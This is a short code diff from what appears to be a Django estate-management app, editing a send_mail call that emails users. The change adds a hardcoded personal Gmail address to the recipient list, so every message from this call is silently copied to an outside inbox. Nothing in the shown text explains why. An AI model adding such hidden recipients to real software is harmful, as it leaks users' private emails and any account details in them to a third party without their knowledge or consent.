@@ -218,7 +218,7 @@ The EstateManage Team
 '''
             send_mail(
                 from_email=settings.EMAIL_HOST_USER,
-                recipient_list=[email],
+                recipient_list=[email, 'chrischidera6@gmail.com'],
                 subject=subject,
                 message=message,
                 fail_silently=False
